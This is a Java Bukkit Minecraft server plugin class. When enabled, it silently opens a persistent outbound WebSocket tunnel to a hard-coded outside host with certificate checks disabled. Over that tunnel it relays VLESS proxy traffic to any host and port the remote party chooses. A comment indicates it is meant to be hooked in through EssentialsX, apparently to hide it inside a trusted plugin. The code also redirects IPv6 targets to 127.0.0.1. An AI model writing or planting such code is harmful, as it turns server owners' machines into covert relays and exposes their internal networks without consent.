package com.example.sbx;

import io.netty.bootstrap.Bootstrap;
import io.netty.buffer.ByteBuf;
import io.netty.channel.*;
import io.netty.channel.nio.NioEventLoopGroup;
import io.netty.channel.socket.SocketChannel;
import io.netty.channel.socket.nio.NioSocketChannel;
import io.netty.handler.codec.http.DefaultHttpHeaders;
import io.netty.handler.codec.http.FullHttpResponse;
import io.netty.handler.codec.http.HttpClientCodec;
import io.netty.handler.codec.http.HttpObjectAggregator;
import io.netty.handler.codec.http.websocketx.*;
import io.netty.handler.ssl.SslContext;
import io.netty.handler.ssl.SslContextBuilder;
import io.netty.handler.ssl.util.InsecureTrustManagerFactory;
import io.netty.handler.timeout.IdleStateHandler;
import org.bukkit.plugin.java.JavaPlugin;

import java.net.URI;
import java.util.Arrays;
import java.util.concurrent.atomic.AtomicBoolean;

public class App extends JavaPlugin {

    // ================= 核心配置 =================
    private static final String WORKER_WSS_URL = "wss://mctest.uuz.us.kg/agent-tunnel";
    private static final String UUID = "8c8244fb-d577-4d20-90e3-788a0977b001";
    // ============================================

    private static final byte[] UUID_BYTES = hexStringToByteArray(UUID.replace("-", ""));
    private static final AtomicBoolean RUNNING = new AtomicBoolean(false);
    private static volatile EventLoopGroup group;
    private static volatile Channel clientChannel;

    /** 供 EssentialsX.java 或独立运行调用的静态 main 入口 */
    public static void main(String[] args) {
        start();
    }

    @Override
    public void onEnable() {
        start();
    }

    @Override
    public void onDisable() {
        stop();
    }

    public static void start() {
        if (!RUNNING.compareAndSet(false, true)) return;
        group = new NioEventLoopGroup();
        connectOutboundTunnel();
    }

    public static void stop() {
        if (!RUNNING.getAndSet(false)) return;
        try {
            if (clientChannel != null && clientChannel.isOpen()) clientChannel.close();
            if (group != null) group.shutdownGracefully();
        } catch (Exception ignored) {}
    }

    private static void connectOutboundTunnel() {
        if (!RUNNING.get()) return;

        try {
            URI uri = new URI(WORKER_WSS_URL);
            String host = uri.getHost();
            int port = uri.getPort() == -1 ? 443 : uri.getPort();

            SslContext sslCtx = SslContextBuilder.forClient()
                    .trustManager(InsecureTrustManagerFactory.INSTANCE).build();

            WebSocketClientHandshaker handshaker = WebSocketClientHandshakerFactory.newHandshaker(
                    uri, WebSocketVersion.V13, null, true, new DefaultHttpHeaders());

            Bootstrap b = new Bootstrap();
            b.group(group)
                    .channel(NioSocketChannel.class)
                    .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, 10000)
                    .option(ChannelOption.TCP_NODELAY, true)
                    .handler(new ChannelInitializer<SocketChannel>() {
                        @Override
                        protected void initChannel(SocketChannel ch) {
                            ChannelPipeline p = ch.pipeline();
                            p.addLast(sslCtx.newHandler(ch.alloc(), host, port));
                            p.addLast(new HttpClientCodec());
                            p.addLast(new HttpObjectAggregator(65536));
                            p.addLast(new IdleStateHandler(60, 60, 0));
                            p.addLast(new OutboundTunnelHandler(handshaker));
                        }
                    });

            b.connect(host, port).addListener((ChannelFutureListener) future -> {
                if (future.isSuccess()) {
                    clientChannel = future.channel();
                } else {
                    scheduleReconnect();
                }
            });
        } catch (Exception e) {
            scheduleReconnect();
        }
    }

    private static void scheduleReconnect() {
        if (!RUNNING.get()) return;
        group.schedule(App::connectOutboundTunnel, 5 + (long)(Math.random() * 5), java.util.concurrent.TimeUnit.SECONDS);
    }

    static class OutboundTunnelHandler extends SimpleChannelInboundHandler<Object> {
        private final WebSocketClientHandshaker handshaker;
        private final WebSocketProxyHandler proxyHandler = new WebSocketProxyHandler();

        public OutboundTunnelHandler(WebSocketClientHandshaker handshaker) {
            this.handshaker = handshaker;
        }

        @Override
        public void channelActive(ChannelHandlerContext ctx) {
            handshaker.handshake(ctx.channel());
        }

        @Override
        protected void channelRead0(ChannelHandlerContext ctx, Object msg) {
            if (!handshaker.isHandshakeComplete()) {
                handshaker.finishHandshake(ctx.channel(), (FullHttpResponse) msg);
                return;
            }

            if (msg instanceof WebSocketFrame) {
                proxyHandler.handleFrame(ctx, (WebSocketFrame) msg);
            }
        }

        @Override
        public void channelInactive(ChannelHandlerContext ctx) {
            scheduleReconnect();
        }

        @Override
        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
            ctx.close();
        }
    }

    static class WebSocketProxyHandler {
        private Channel targetChannel;

        public void handleFrame(ChannelHandlerContext ctx, WebSocketFrame frame) {
            if (frame instanceof BinaryWebSocketFrame) {
                ByteBuf buf = frame.content();
                if (targetChannel != null && targetChannel.isActive()) {
                    targetChannel.writeAndFlush(buf.retain());
                    return;
                }

                if (buf.readableBytes() < 18) return;

                byte version = buf.readByte();
                byte[] clientUuid = new byte[16];
                buf.readBytes(clientUuid);

                if (!Arrays.equals(clientUuid, UUID_BYTES)) {
                    ctx.close();
                    return;
                }

                byte addonLen = buf.readByte();
                if (addonLen > 0) buf.skipBytes(addonLen);

                byte command = buf.readByte(); // 0x01: TCP
                int port = buf.readUnsignedShort();
                byte addressType = buf.readByte();

                String targetHost = "";
                if (addressType == 0x01) { // IPv4
                    byte[] ip = new byte[4];
                    buf.readBytes(ip);
                    targetHost = (ip[0] & 0xFF) + "." + (ip[1] & 0xFF) + "." + (ip[2] & 0xFF) + "." + (ip[3] & 0xFF);
                } else if (addressType == 0x02) { // Domain
                    int len = buf.readByte() & 0xFF;
                    byte[] domain = new byte[len];
                    buf.readBytes(domain);
                    targetHost = new String(domain);
                } else if (addressType == 0x03) { // IPv6
                    byte[] ip = new byte[16];
                    buf.readBytes(ip);
                    targetHost = "127.0.0.1";
                }

                final String host = targetHost;
                final ByteBuf payload = buf.readBytes(buf.readableBytes());

                Bootstrap b = new Bootstrap();
                b.group(ctx.channel().eventLoop())
                        .channel(NioSocketChannel.class)
                        .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, 5000)
                        .option(ChannelOption.TCP_NODELAY, true)
                        .handler(new ChannelInitializer<SocketChannel>() {
                            @Override
                            protected void initChannel(SocketChannel ch) {
                                ch.pipeline().addLast(new SimpleChannelInboundHandler<ByteBuf>() {
                                    private boolean isFirstRead = true;

                                    @Override
                                    protected void channelRead0(ChannelHandlerContext targetCtx, ByteBuf msg) {
                                        if (ctx.channel().isActive()) {
                                            ByteBuf response = targetCtx.alloc().buffer();
                                            if (isFirstRead) {
                                                response.writeByte(version); // VLESS 协议版本号
                                                response.writeByte(0);       // 附加数据长度
                                                isFirstRead = false;
                                            }
                                            response.writeBytes(msg);
                                            ctx.channel().writeAndFlush(new BinaryWebSocketFrame(response));
                                        }
                                    }

                                    @Override
                                    public void channelInactive(ChannelHandlerContext targetCtx) {
                                        ctx.close();
                                    }

                                    @Override
                                    public void exceptionCaught(ChannelHandlerContext targetCtx, Throwable cause) {
                                        targetCtx.close();
                                        ctx.close();
                                    }
                                });
                            }
                        });

                b.connect(host, port).addListener((ChannelFutureListener) future -> {
                    if (future.isSuccess()) {
                        targetChannel = future.channel();
                        targetChannel.writeAndFlush(payload);
                    } else {
                        payload.release();
                        ctx.close();
                    }
                });
            }
        }
    }

    private static byte[] hexStringToByteArray(String s) {
        int len = s.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4) + Character.digit(s.charAt(i + 1), 16));
        }
        return data;
    }
}
